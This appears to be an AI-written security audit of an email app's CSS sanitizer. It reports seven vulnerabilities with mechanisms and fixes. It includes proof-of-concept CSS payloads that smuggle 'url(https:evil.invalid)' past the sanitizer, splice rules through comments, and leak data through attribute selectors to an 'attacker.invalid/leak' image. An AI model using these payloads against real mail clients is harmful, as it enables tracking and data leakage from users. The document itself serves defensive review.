# Security Review: CSS & Stylesheet Sanitization (`9583e34`)

**Reviewer:** Gemini (`wt-gemini`)
**Scope:**
- `mail/src/main/kotlin/app/dot/mail/engine/HtmlSanitizer.kt`
- `app/src/main/kotlin/app/dot/mail/ui/thread/HtmlMessageView.kt`
- `mail/src/test/kotlin/app/dot/mail/engine/HtmlSanitizerTest.kt`

---

## Executive Summary

Commit `9583e34` introduced rule-by-rule `<style>` reconstruction (`HtmlSanitizer.sanitizeStylesheet`), preserved `class`, `id`, `align`, and `bgcolor` attributes, permitted `rgb()`/`rgba()` and `!important` in declarations, and added fixed-width (`layoutWidth`) and `@media (max-width…)` (`responsive`) detection for `HtmlMessageView`.

While the defense-in-depth architecture in `HtmlMessageView` (JavaScript disabled, `SafeClient.shouldInterceptRequest` blocking all subresource loads unless `allowRemote = true`, opaque `null` base URL) prevents network egress when remote images are blocked, we identified **2 P0** and **5 P1** vulnerabilities in `HtmlSanitizer.kt` that allow an attacker to smuggle arbitrary CSS tokens (including `background: url(...)` when the user enables remote images), probe DOM attributes via CSS selectors, corrupt or swallow subsequent stylesheet rules via parser differentials, spoof message layout with negative margins, or trigger CPU/memory DoS with unbounded `<style>` blocks.

All 7 issues were reproduced with failing tests in `HtmlSanitizerTest.kt` first, and then fixed in `HtmlSanitizer.kt`.

---

## Findings & Remediations

### 1. [P0] Cross-Rule Unbalanced Quote + Selector Token Smuggling (`url(https:evil.invalid)`)
- **Location:** `HtmlSanitizer.kt` (`safeValue`, `safeSelector`, `declaration`, `sanitizeStylesheet`)
- **Mechanism:**
  1. `safeValue` (`[a-zA-Z0-9#.,%\s'"+/-]+`) permitted unbalanced `"` and `'` characters in **any** CSS property (including `background`), and `safeSelector` (`[a-zA-Z0-9\s.#,_*>+~:=\[\]"'()-]+`) permitted `"`, `'`, `(`, `)`, and `:` in selectors.
  2. In CSS Syntax Module Level 3 (Chromium/Blink), a quoted string token `"..."` does **not** close at `}`; it only closes at a matching `"` or an unescaped newline. Because `sanitizeStylesheet` emits the entire rebuilt stylesheet on a single line without newlines, an unclosed `"` in Rule 1's declaration value swallows the closing `}` of Rule 1 and continues into Rule 2's selector (`prelude`), where the matching `"` closes the string literal and exposes the rest of Rule 2's selector as **live declaration tokens inside Rule 1's block**.
  3. Furthermore, under the WHATWG URL Standard implemented by Chromium, special schemes (`http:` and `https:`) do **not** require `//` (`url(https:evil.invalid)` resolves to `https://evil.invalid/`), bypassing the absence of `/` in `safeSelector`.
- **Proof of Concept:**
  ```css
  .a { background: " } " url(https:evil.invalid) { color: red }
  ```
  - **Previous `sanitizeStylesheet` output:**
    ```css
    .a{background:"}" url(https:evil.invalid){color:red}
    ```
  - **Chromium CSS parse result:** Inside `.a { background: ... }`, `"}"` is parsed as a string token followed immediately by `url(https:evil.invalid)` as part of the `background` shorthand! When the user enables remote images (`allowRemote = true`), Chromium fetches `https://evil.invalid/`.
- **Fix:**
  - Removed `"` and `'` from `safeSelector`.
  - Prohibited `"` and `'` in all CSS properties except `font` and `font-family`.
  - Added `hasBalancedQuotes(value)` to enforce strictly balanced, non-nested quotes in `font` / `font-family`.

---

### 2. [P0] Comment-Inside-String Parser Desynchronization & Unclosed Comments (`/*`)
- **Location:** `HtmlSanitizer.kt` (`sanitizeStylesheet` line 69)
- **Mechanism:**
  - `sanitizeStylesheet` stripped comments with a regex (`css.replace(Regex("(?s)/\\*.*?\\*/"), " ")`) without tracking whether `/*` or `*/` was inside a quoted string, and left unclosed `/*` comments intact in `text`.
  - In Chromium's CSS tokenizer, `/*` inside `"/*"` is part of a string literal, whereas the naive regex matched from `/*` inside Rule 1's string to `*/` inside a comment in Rule 2, deleting the intervening `}` and splicing Rule 1 and Rule 2 together.
- **Proof of Concept:**
  ```css
  .a { font-family: "/*"; }
  .b { background: url(https://evil.invalid); /* */ "; color: red; }
  ```
  - **Previous `sanitizeStylesheet` output:** `.a{font-family:" ";color:red}` (spliced across rules).
- **Fix:**
  - Replaced the regex with a string-aware scanner `stripCssComments(css)` that rejects any stylesheet where `/*` or `*/` appears inside a quoted string or where a stray `*/` appears outside a comment, and truncates cleanly at EOF if an unclosed `/*` is encountered.

---

### 3. [P1] CSS Attribute Selector & Relational Pseudo-Class Exfiltration (`[attr*=...]`, `:has(...)`)
- **Location:** `HtmlSanitizer.kt` (`safeSelector` line 59)
- **Mechanism:**
  - `safeSelector` allowed `[`, `]`, `=`, `~`, `"`, `'`, `:`, `(`, `)`.
  - When a user allows remote images (`allowRemote = true`), an attacker can combine `<img class="probe-x" src="https://attacker.invalid/leak?x">` with attribute selectors (`a[href*="token=x"]`) or relational pseudo-classes (`body:has(a[href*="secret"]) .probe-x`) to conditionally style/hide elements based on sensitive URLs, reset tokens, or email addresses present in quoted thread history.
  - Additionally, unbalanced `[` or `(` in a selector causes Chromium's CSS parser to consume the following `{ ... }` block as part of the selector prelude.
- **Fix:**
  - Restricted `safeSelector` to `Regex("[a-zA-Z0-9\\s.#,_*>+-]+")` — permitting standard element, `.class`, `#id`, `*`, descendant, child (`>`), adjacent (`+`), and comma-separated selectors while blocking all attribute selectors (`[...]`), pseudo-classes/pseudo-elements (`:...`), quotes, and parentheses.

---

### 4. [P1] Unbalanced `@media` Parentheses Swallowing Subsequent Rules
- **Location:** `HtmlSanitizer.kt` (`safeMedia` line 60)
- **Mechanism:**
  - `safeMedia` (`Regex("(?i)@media[a-z0-9\\s(),:.-]*")`) neither required a word boundary after `@media` (`@mediaall`) nor checked that parentheses `(` and `)` were balanced (`@media (max-width: 600px`).
  - In Chromium, an unclosed `(` in an `@media` prelude swallows the opening `{` and all nested rules until a matching `)` or EOF.
- **Fix:**
  - Tightened `safeMedia` to `Regex("(?i)^@media(?:\\s+[a-z0-9]+|\\s*\\()[a-z0-9\\s(),:.-]*$")` and added `hasBalancedParens(prelude)` (rejecting unbalanced or empty `()` parentheses).

---

### 5. [P1] In-WebView UI Spoofing via Negative Margins & Negative `text-indent`
- **Location:** `HtmlSanitizer.kt` (`declaration` / `safeValue`)
- **Mechanism:**
  - `safeValue` allowed `-` before digits on all properties, permitting `margin-top: -2000px`, `margin: -50px 0`, or `text-indent: -9999px`.
  - While content cannot escape the WebView to cover native Compose chrome (such as the "Remote images blocked" banner), negative margins allow later blocks in an email (e.g. below a quoted reply header) to shift upward and visually overlay earlier text inside the WebView.
- **Fix:**
  - Added `negativeNumber = Regex("(?<![a-zA-Z0-9_-])-\\s*\\.?[0-9]")` check in `declaration()` to reject negative numeric values on all layout/sizing properties (while still permitting hyphenated keywords like `-apple-system` or `inline-block`).

---

### 6. [P1] Obfuscated `url/*...*/(...)`, `image-set("...")`, and `@font-face` Bypassing `hasRemoteImages` / `blockedRemoteResources`
- **Location:** `HtmlSanitizer.kt` (line 114)
- **Mechanism:**
  - `Regex("(?i)url\\s*\\(|@import|\\\\")` was evaluated before stripping CSS comments and did not match `url/*comment*/(...)`, `image-set("https://evil.invalid/a.png" 1x)` (which in CSS Images Level 4 accepts a raw string URL without `url()`), or `@font-face`. It also skipped `el.attr("style")` whenever `el.tagName() == "style"`.
  - Although the unsafe declarations were dropped from output, `Result.hasRemoteImages` and `Result.blockedRemoteResources` were not incremented, suppressing the "Remote content blocked" indicator when no other remote `<img src>` was present.
- **Fix:**
  - Added `containsRemoteCss(css)` checking `Regex("(?i)url\\s*\\(|image-set\\s*\\(|@import|@font-face|\\\\")` against both raw and comment-stripped CSS for both `el.attr("style")` and `<style>` data.

---

### 7. [P1] Denial of Service via Unbounded `<style>` Blocks and Rule Counts
- **Location:** `HtmlSanitizer.kt` (`sanitizeStylesheet`, `sanitize`)
- **Mechanism:**
  - No upper bound existed on `<style>` input length, rule count, declaration count per rule, selector length, or total accumulated stylesheet length across multiple `<style>` elements.
- **Fix:**
  - Added explicit bounds:
    - `MAX_STYLE_TAG_CHARS = 65_536` (64 KB input per `<style>`)
    - `MAX_TOTAL_CSS_CHARS = 32_768` (32 KB total sanitized CSS output)
    - `MAX_CSS_RULES = 500`
    - `MAX_DECLARATIONS_PER_RULE = 48`
    - `MAX_SELECTOR_CHARS = 256`
    - `MAX_VALUE_CHARS = 256`

---

## Review of `HtmlMessageView.kt`

- **Network & Subresource Isolation:** `SafeClient.shouldInterceptRequest` blocks all non-allowlisted schemes (`EMPTY()` 204 response), permits `content://` only when the exact URI is in `inlineUris`, and permits `http`/`https` only when `allowRemote == true`. `blockNetworkLoads` and `blockNetworkImage` are also toggled in `WebSettings`.
- **Origin & Script Isolation:** `javaScriptEnabled = false`, `allowFileAccess = false`, `allowContentAccess = false`, `domStorageEnabled = false`, and `loadDataWithBaseURL(null, ...)` (opaque origin) are properly configured.
- **Viewport Scaling (`layoutWidth` / `responsive`):** `viewportWidth` is computed purely from integer `layoutWidth` capped at `MAX_LAYOUT_WIDTH = 1280` and interpolated as an integer into `<meta name="viewport" content="width=$viewportWidth">`, preventing any attribute or markup injection in `wrap()`.
